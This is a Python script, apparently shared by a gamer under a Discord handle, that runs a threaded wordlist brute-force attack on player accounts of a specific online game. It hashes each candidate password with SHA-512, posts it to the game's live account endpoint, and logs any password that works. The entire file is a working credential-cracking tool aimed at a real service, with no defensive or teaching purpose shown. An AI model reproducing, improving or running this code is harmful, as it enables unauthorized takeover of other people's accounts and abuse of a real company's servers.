## Auther: looder (iQ)
## Discord: 3yni

import requests
import hashlib
import os
from datetime import datetime
import threading
import sys

main_path = os.path.dirname(__file__)
worldlist_path = os.path.join(main_path, "WorldList")
log_path = os.path.join(main_path, "log.txt")
username = input("Username.> ")

WORKERS_NUMBER = 2
stop_flag = False
lock = threading.Lock()
successes = []

def log(msg, debug=False):
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M]")
    if debug:
        print(msg)
    with open(log_path, "a", encoding="utf-8") as file:
        file.write(f"{timestamp} {msg}\n")

def load_passwords(debug=True):
    if not os.path.exists(worldlist_path):
        log("WorldList folder not found.", debug=debug)
        return []

    seen = set()
    unique_pass = []

    files = os.listdir(worldlist_path)
    print(f"{len(files)} files to load.")

    total_loaded = 0
    for filename in files:
        file_path = os.path.join(worldlist_path, filename)
        if os.path.isfile(file_path):
            count = 0
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    for line in f:
                        pw = line.strip()
                        if pw and pw not in seen:
                            unique_pass.append(pw)
                            seen.add(pw)
                            count += 1
                log(f"Loaded {count} passwords from {filename}", debug=debug)
                total_loaded += count
            except Exception as e:
                log(f"Error reading file {filename}: {str(e)}")
    log(f"Total loaded passwords before filtering: {total_loaded}", debug=debug)
    log(f"Unique passwords: {len(unique_pass)}", debug=debug)
    return unique_pass

def hash_pass(text):
    return hashlib.sha512(text.encode("utf-8")).hexdigest().upper()

def crack(username, password, pw_queue=None):
    url = "https://fa.blayzegames.com/OnlineAccountSystem_NewFPS//get-battlepass-progress.php"
    payload = {"username": username, "password": hash_pass(password)}
    try:
        response = requests.post(url, data=payload)
        try:
            json_obj = response.json()
        except ValueError:
            if pw_queue is not None:
                pw_queue.put(password)
                print("VALUE ERROR")
            return False

        if json_obj.get("status", 1) == 0:
            log(f"Username: {username} - Password: {password} [SUCCESS]", debug=True)
            return True
        else:
            print(f"Failed password: {password}")
            return False
    except Exception as e:
        log(f"Request failed for password {password}: {str(e)}", debug=True)
        return False

def worker(password_chunk):
    global stop_flag
    for password in password_chunk:
        if stop_flag:
            break
        if crack(username, password):
            with lock:
                successes.append(password)
            stop_flag = True
            break

def start(unique_passwords):
    global stop_flag
    total = len(unique_passwords)
    chunk_size = total // WORKERS_NUMBER
    chunks = []

    for i in range(WORKERS_NUMBER):
        start_idx = i * chunk_size
        end_idx = (i + 1) * chunk_size if i < WORKERS_NUMBER - 1 else total
        chunks.append(unique_passwords[start_idx:end_idx])

    threads = []
    for chunk in chunks:
        t = threading.Thread(target=worker, args=(chunk,))
        t.daemon = True
        t.start()
        threads.append(t)
    try:
        while any(t.is_alive() for t in threads):
            for t in threads:
                t.join(timeout=0.1)
    except KeyboardInterrupt:
        print("\nCTRL-C pressed! Exiting immediately...")
        stop_flag = True
        sys.exit(0)

    if successes:
        print(f"Password found: {successes[0]}")
    else:
        print("No password found.")

if __name__ == "__main__":
    unique_passwords = load_passwords()
    if len(unique_passwords) == 0:
        print("Error passwords number is 0")
    else:
        if unique_passwords:
            start(unique_passwords)